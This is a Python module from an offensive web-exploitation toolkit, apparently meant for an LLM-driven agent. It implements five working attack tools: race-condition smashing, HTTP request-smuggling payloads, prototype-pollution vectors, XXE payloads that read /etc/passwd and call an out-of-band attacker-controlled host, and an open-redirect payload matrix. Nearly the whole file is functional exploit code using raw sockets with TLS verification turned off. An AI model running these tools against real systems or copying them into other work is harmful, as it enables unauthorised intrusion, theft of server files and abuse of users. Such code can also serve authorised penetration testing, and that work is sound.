"""VOIDFORGE :: advanced_web — the missing exploit classes.

Research-driven additions after gap-matrix review against state-of-the-art
practice (Turbo Intruder race technique, PortSwigger smuggling differential,
prototype-pollution gadget hunting, XXE entity ladders, open-redirect casts):
  race_smash      — barrier-synchronized parallel request races
  smuggle_probe   — CL.TE / TE.CL / TE.TE desync differential probes
  proto_pollute   — prototype pollution via query + JSON merge variants
  xxe_probe       — XXE external-entity file read (in-band + base64 wrappers)
  redirect_cast   — open-redirect parameter × payload matrix
Every tool returns the standard verdict contract. Sockets used raw where
HTTP libraries would normalize away the attack.
"""
import json, socket, ssl, threading, time
from urllib.parse import quote, urlencode, urlsplit

from tools import register
from tools._exploit_lib import marker, verdict
import tools._transport as _t

MARKS = ("admin", "root:", "daemon", "bin:", "sys:", "USER=")


def _raw_roundtrip(host, port, raw_bytes, timeout=8, use_ssl=False):
    """Send raw bytes over a fresh socket, return (status_line, body_head, dt)."""
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=host)
        s.settimeout(timeout)
        s.sendall(raw_bytes)
        chunks = []
        total = 0
        while total < 16384:
            try:
                b = s.recv(4096)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
            total += len(b)
            # V14 (audit 5.1): the old break demanded `total > 400` AFTER
            # headers — a short response never reached it and the loop sat
            # on recv until the full 8s timeout per request. Headers
            # complete = status line captured = we're done here.
            if b"\r\n\r\n" in b"".join(chunks):
                break
        s.close()
        data = b"".join(chunks).decode(errors="replace")
        head, _, body = data.partition("\r\n\r\n")
        return head.split("\r\n")[0] if head else "", body[:1200], time.time() - t0
    except Exception as ex:
        return f"ERR {type(ex).__name__}", "", time.time() - t0


def _split_url(url):
    u = urlsplit(url)
    return u.hostname or "127.0.0.1", u.port or (443 if u.scheme == "https" else 80), \
        (u.path or "/") + (("?" + u.query) if u.query else ""), u.scheme == "https"


# ── 1. RACE CONDITIONS ────────────────────────────────────────────
@register(name="race_smash",
          desc="EXPLOIT: race-condition smasher — barrier-released parallel requests (Turbo Intruder style). Prove double-processing on limits, votes, withdrawals, coupon redemption, password reset.",
          params={"type": "object", "properties": {
              "url": {"description": "endpoint whose action must execute only once", "type": "string"},
              "body": {"description": "request body (e.g. coupon=FREE, amount=100)"},
              "headers": {"description": "auth headers dict (session of the victim account)"},
              "method": {"description": "HTTP method", "type": "string"},
              "concurrency": {"description": "parallel requests per round", "type": "integer"},
              "rounds": {"description": "how many race rounds", "type": "integer"},
              "success_pattern": {"description": "marker proving the action was processed (e.g. applied, success)", "type": "string"}},
              "required": ["url"]},
          danger="loud")
def race_smash(url, body=None, headers=None, method="POST",
               concurrency=20, rounds=3, success_pattern=None):
    # calib-B fix: the LLM sends rounds/concurrency as strings — the
    # schema lacked types so _coerce_args passed them raw and
    # range("3") crashed. Coerce here (defense in depth) + schema typed.
    try:
        rounds = int(rounds)
    except (TypeError, ValueError):
        rounds = 3
    try:
        concurrency = int(concurrency)
    except (TypeError, ValueError):
        concurrency = 20
    rounds = max(1, min(rounds, 20))
    concurrency = max(2, min(concurrency, 60))
    host, port, path, use_ssl = _split_url(url)
    if isinstance(headers, str):
        try:
            headers = json.loads(headers)
        except (json.JSONDecodeError, ValueError):
            headers = {}
    headers = dict(headers or {})

    # Ω1.1 (audit-6): Support JSON payloads & preserve custom Content-Type
    is_json = False
    for k, v in headers.items():
        if k.lower() == "content-type" and "json" in str(v).lower():
            is_json = True
            break

    if isinstance(body, dict):
        if is_json:
            body = json.dumps(body)
        else:
            body = urlencode(body)
    elif body is None:
        body = ""
    else:
        body = str(body)
        if not is_json and (body.startswith("{") or body.startswith("[")):
            is_json = True
            if not any(k.lower() == "content-type" for k in headers):
                headers["Content-Type"] = "application/json"

    # Only add default Content-Type if none was specified in headers
    ct_hdr = ""
    if not any(k.lower() == "content-type" for k in headers):
        ct_hdr = "Content-Type: application/json\r\n" if is_json else "Content-Type: application/x-www-form-urlencoded\r\n"

    hl = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    findings = []
    baseline_st = None
    for rnd in range(rounds):
        results = [None] * concurrency
        barrier = threading.Barrier(concurrency)
        sock_err = []

        def fire(i):
            req = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"{hl}{ct_hdr}"
                   f"Content-Length: {len(body.encode('utf-8'))}\r\n"
                   f"Connection: close\r\n\r\n{body}").encode("utf-8")
            try:
                barrier.wait(timeout=10)
            except threading.BrokenBarrierError:
                sock_err.append("barrier")
                return
            results[i] = _raw_roundtrip(host, port, req, use_ssl=use_ssl)

        threads = [threading.Thread(target=fire, args=(i,)) for i in range(concurrency)]
        for th in threads:
            th.start()
        for th in threads:
            th.join(15)
        sts = [(r[0], r[1], r[2]) for r in results if r]
        hits = [s for s, body, _ in sts if success_pattern and success_pattern.lower() in (body or "").lower()]
        if baseline_st is None:
            baseline_st = sts[0][0] if sts else ""
        ok200 = sum(1 for s, _, _ in sts if " 200" in s)
        findings.append({"round": rnd + 1, "sent": concurrency, "ok200": ok200,
                         "pattern_hits": len(hits), "rtts": [round(d, 3) for _, _, d in sts[:6]]})
        time.sleep(0.4)

    total_ok = sum(f["ok200"] for f in findings)
    total_hits = sum(f["pattern_hits"] for f in findings)
    if success_pattern:
        exploitable = total_hits > concurrency  # more successes than single-fire plausibly allows
        summary = (f"{total_hits} pattern hits across {rounds} rounds of {concurrency} — "
                   f"double-processing {'CONFIRMED' if exploitable else 'not evident'}")
    else:
        exploitable = "partial"
        summary = (f"races executed ({total_ok} ok-200 responses across {rounds} rounds); "
                   f"supply success_pattern to confirm double-processing")
    return verdict("race_smash", exploitable, summary, evidence=findings[:3],
                   baseline=baseline_st, concurrency=concurrency, rounds=rounds)


# ── 2. REQUEST SMUGGLING ─────────────────────────────────────────
@register(name="smuggle_probe",
          desc="EXPLOIT: HTTP request smuggling — CL.TE, TE.CL and TE.TE desync differentials with timing + poison-follower confirmation. High-impact against front/back proxy stacks.",
          params={"type": "object", "properties": {
              "url": {"description": "base URL of the endpoint to desync-test"},
              "poison_path": {"description": "path the smuggled prefix should poison (e.g. /admin)"}},
              "required": ["url"]},
          danger="loud")
def smuggle_probe(url, poison_path="/admin"):
    host, port, path, use_ssl = _split_url(url)
    results = []

    def attempt(tag, req_bytes, delay_hint):
        # probe: smuggled request, then a clean follower on the same socket
        s = None
        try:
            s = socket.create_connection((host, port), timeout=8)
            if use_ssl:
                ctx = ssl._create_unverified_context()
                s = ctx.wrap_socket(s, server_hostname=host)
            s.settimeout(delay_hint)
            s.sendall(req_bytes)
            time.sleep(delay_hint)
            # follower request — if desync, it inherits the smuggled prefix
            follow = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
            s.sendall(follow)
            data = b""
            try:
                while len(data) < 8192:
                    b = s.recv(4096)
                    if not b:
                        break
                    data += b
            except socket.timeout:
                pass
            text = data.decode(errors="replace")
            results.append({"variant": tag, "follower_head": text.split("\r\n")[0][:60],
                            "poisoned": poison_path in text or "smuggled" in text.lower()})
        except Exception as ex:
            results.append({"variant": tag, "error": f"{type(ex).__name__}"[:60]})
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass

    hn = host.encode()
    pp = poison_path.encode()
    # CL.TE: front trusts CL, back trusts TE — body "0\r\n\r\nG" smuggles G
    attempt("CL.TE",
            (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\n"
             f"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
             f"0\r\n\r\nGET {path} HTTP/1.1\r\n").encode(), 1.2)
    # TE.CL: front trusts TE, back trusts CL — CL set short, remainder smuggles
    attempt("TE.CL",
            (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
             f"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
             f"12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n").encode(), 1.2)
    # TE.TE: obfuscated TE header both sides must resolve — timing/400 tells
    attempt("TE.TE",
            (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
             f" Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
             f"1\r\nZ\r\n0\r\n\r\n").encode(), 1.2)

    poisoned = [r["variant"] for r in results if r.get("poisoned")]
    errs = [r["variant"] for r in results if r.get("error")]
    exploitable = bool(poisoned)
    summary = (f"desync confirmed via {poisoned} — front/back proxy disagreement"
               if exploitable else
               f"no desync detected ({len(errs)}/{len(results)} inconclusive)" if errs
               else "no desync detected — proxies agree on framing")
    return verdict("smuggle_probe", exploitable, summary, evidence=results)


# ── 3. PROTOTYPE POLLUTION ───────────────────────────────────────
@register(name="proto_pollute",
          desc="EXPLOIT: prototype pollution — query (__proto__[x], constructor[prototype][x]) and JSON-merge body variants with response-diff gadget detection. Client and server side.",
          params={"type": "object", "properties": {
              "url": {"description": "endpoint; query pollution is appended, JSON body posted if method POST"},
              "gadget_check": {"description": "second URL whose behavior should change if pollution landed (e.g. /profile or /admin)"},
              "method": {"description": "POST to also test JSON merge pollution"},
              "body": {"description": "JSON body to merge-pollute (posted with __proto__ injected)"}},
              "required": ["url"]},
          danger="loud")
def proto_pollute(url, gadget_check=None, method="GET", body=None):
    from tools._exploit_lib import paced_send
    canary = "vfs" + marker("PP").replace("-", "")
    variants = []

    q_sep = "&" if "?" in url else "?"
    q_variants = {
        "bracket": url + q_sep + urlencode({f"__proto__[{canary}]": "yes"}),
        "constructor": url + q_sep + urlencode({f"constructor[prototype][{canary}]": "yes"}),
        "dot": url + q_sep + f"__proto__.{canary}=yes",
    }
    for tag, vurl in q_variants.items():
        st, resp, _ = paced_send(vurl, timeout=15)
        variants.append({"vector": f"query:{tag}", "status": st,
                         "reflected": canary in (resp or "")})

    if method.upper() == "POST":
        base = {}
        if body:
            try:
                base = json.loads(body)
            except Exception:
                base = {"input": str(body)[:100]}
        jv = dict(base)
        jv["__proto__"] = {canary: "yes"}
        payload = json.dumps(jv)
        st, resp, _ = paced_send(url, method="POST", body=payload.encode(),
                                 headers={"Content-Type": "application/json"}, timeout=15)
        variants.append({"vector": "json_merge", "status": st,
                         "reflected": canary in (resp or "")})

    gadget = None
    if gadget_check:
        st, resp, _ = paced_send(gadget_check, timeout=15)
        gadget = {"url": gadget_check, "status": st, "canary_leaked": canary in (resp or "")}

    server_hit = gadget and gadget["canary_leaked"]
    reflected_any = any(v.get("reflected") for v in variants)
    exploitable = bool(server_hit) or ("json_merge" in [v["vector"] for v in variants]
                                       and reflected_any and method.upper() == "POST")
    summary = (f"pollution {'CONFIRMED' if server_hit else 'reflected only'} "
               f"({sum(v['reflected'] for v in variants)}/{len(variants)} vectors reflect)"
               + (f" — gadget at {gadget_check} leaked canary" if server_hit else ""))
    return verdict("proto_pollute", exploitable if server_hit else ("partial" if reflected_any else False),
                   summary, evidence=variants, gadget=gadget)


# ── 4. XXE ───────────────────────────────────────────────────────
@register(name="xxe_probe",
          desc="EXPLOIT: XXE — external entity injection ladders (classic file read, PHP base64 filter wrapper, parameter entities, CDATA). In-band extraction with OS-marker confirmation.",
          params={"type": "object", "properties": {
              "url": {"description": "endpoint that accepts XML (Content-Type application/xml)"},
              "file": {"description": "file to exfiltrate"},
              "extra_fields": {"description": "other XML fields the endpoint expects, as dict"}},
              "required": ["url"]},
          danger="loud")
def xxe_probe(url, file="/etc/passwd", extra_fields=None):
    from tools._exploit_lib import paced_send
    from tools.oob_channel import (oob_url as _oob_url,
                                   register as _oob_register,
                                   receipt as _oob_receipt)
    results = []
    fields = ""
    for k, v in (extra_fields or {}).items():
        fields += f"<{k}>{v}</{k}>"

    # OOB lane (Phase 0.1): blind XXE — the parser swallows the direct
    # echo but still resolves external parameter entities. The proof is
    # OUR domain resolving. Freeze the predicate pre-send (nuclei
    # RequestEvent), fire the parameter-entity ladder, then the receipt
    # (or its absence) decides CONFIRMED vs hypothesis.
    import urllib.parse as _up
    _host = _up.urlsplit(url).netloc or "unknown"
    _oob = _oob_url("xxe", _host)
    _oob_register("xxe", _host,
                  lambda inter: inter.get("protocol") in ("dns", "http", "https"),
                  context={"url": url, "file": file})
    # The blind probe: %remote; INSIDE the internal subset makes the
    # parser fetch our URL. The body references NOTHING undefined — a
    # dangling %file; or &xxe; here errors-out strict parsers BEFORE the
    # fetch, and the callback would never fire (review bug #1).
    oob_decl = (f'<!ENTITY % remote SYSTEM "http://{_oob}/probe">\n'
                '%remote;')
    # per-variant (decl, data): in-band ladders echo &xxe;; the OOB
    # variant's body stays inert — the resolution IS the proof.
    variants = {
        "classic": (f'<!ENTITY xxe SYSTEM "file://{file}">', "&xxe;"),
        "php_filter": ('<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode'
                       f'/resource={file}">', "&xxe;"),
        "utf16_classic": (f'<!ENTITY xxe SYSTEM "file://{file}">', "&xxe;"),
        "oob_param_entity": (oob_decl, "probe"),
    }
    wrappers_order = ["classic", "php_filter", "utf16_classic",
                      "oob_param_entity"]

    for tag in wrappers_order:
        decl, data_ref = variants[tag]
        xml = (f'<?xml version="1.0"?>\n<!DOCTYPE root [\n{decl}\n]>\n'
               f'<root>{fields}<data>{data_ref}</data></root>')
        st, resp, _ = paced_send(url, method="POST", body=xml.encode(),
                                  headers={"Content-Type": "application/xml"}, timeout=15)
        body = resp or ""
        hit = any(m in body for m in MARKS)
        b64ish = ("classic" not in tag and len(body) > 60
                  and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n\r" for c in body[:120]))
        results.append({"variant": tag, "status": st, "file_marker": hit,
                        "b64_payload": b64ish, "excerpt": body[:200]})

    hit = any(r["file_marker"] or r["b64_payload"] for r in results)
    _oob_rec = _oob_receipt("xxe", _host)
    # a REAL HTTP response (>0): synthetic -1 transport-dead, -2 budget,
    # -3 quarantine-skip are NOT "the endpoint responded" (review bug #2)
    responded = any(isinstance(r.get("status"), int) and r["status"] > 0
                    for r in results)
    # law #2: blind XXE is CONFIRMED only by the callback. In-band markers
    # confirm directly; a responding-but-silent endpoint stays 'partial'
    # (hypothesis — predicate frozen, callback pending); silence stays False.
    if _oob_rec or hit:
        exploitable = True
    elif responded:
        exploitable = "partial"
    else:
        exploitable = False
    summary = (f"XXE file read {'CONFIRMED' if hit else 'not evident'} on {file} — "
               f"{sum(r['file_marker'] for r in results)}/{len(results)} variants returned OS markers"
               + (f" — BLIND XXE CONFIRMED via OOB callback ({_oob_rec['protocol']})"
                  if _oob_rec else ""))
    return verdict("xxe_probe", exploitable, summary,
                   evidence=[r["excerpt"] for r in results[:3]],
                   oob={"url": _oob, "callback_received": bool(_oob_rec),
                        "proof": _oob_rec},
                   variants=results)


# ── 5. OPEN REDIRECT ─────────────────────────────────────────────
@register(name="redirect_cast",
          desc="EXPLOIT: open redirect — parameter × payload matrix across 12 common redirect params and 6 bypass payload shapes; confirms via 3xx Location header or meta/JS in body.",
          params={"type": "object", "properties": {
              "url": {"description": "endpoint with a redirect-taking parameter"},
              "params": {"description": "additional candidate parameter names"},
              "evil": {"description": "attacker host to redirect to (default vfs-redir.example)"}},
              "required": ["url"]},
          danger="safe")
def redirect_cast(url, params=None, evil="vfs-redir.example"):
    from tools._exploit_lib import paced_send
    cand = params or []
    cand += ["url", "next", "redirect", "redirect_uri", "return", "returnTo", "r",
             "u", "target", "goto", "dest", "destination", "continue", "link", "redir"]
    payloads = [f"https://{evil}/x", f"//{evil}/x", f"/\\{evil}/x", f"https:{evil}/x",
                f"///{evil}/x", f"https://trusted.{evil}@{evil}/x"]
    hits = []
    tested = 0
    for p in dict.fromkeys(cand):
        for pay in payloads:
            u = url + ("&" if "?" in url else "?") + urlencode({p: pay})
            tested += 1
            # raw socket: paced_send hides headers, and redirects live in headers
            host, port, path, use_ssl = _split_url(u)
            from urllib.parse import quote
            req = (f"GET {quote(path, safe='/?&=#%')} HTTP/1.1\r\nHost: {host}\r\n"
                   f"User-Agent: {_t.UA}\r\nConnection: close\r\n\r\n").encode()
            head, body, _dt = _raw_roundtrip(host, port, req, use_ssl=use_ssl)
            try:
                st = int(head.split(" ")[1]) if head.startswith("HTTP") else 0
            except Exception:
                st = 0
            if 300 <= st < 400:
                loc = next((line.split(":", 1)[1].strip()
                            for line in head.split("\r\n")
                            if line.lower().startswith("location:")), "")
                if evil in loc:
                    hits.append({"param": p, "payload": pay, "status": st, "location": loc})
                    break  # one payload per param is enough to confirm
            if st == 200 and evil in (body or "") and ("<meta" in body or "location.href" in body):
                hits.append({"param": p, "payload": pay, "status": st, "client_side": True})
                break
    exploitable = bool(hits)
    summary = (f"open redirect CONFIRMED via param '{hits[0]['param']}' ({tested} probes)"
               if exploitable else f"no open redirect across {tested} probes")
    return verdict("redirect_cast", exploitable, summary, evidence=hits[:5])
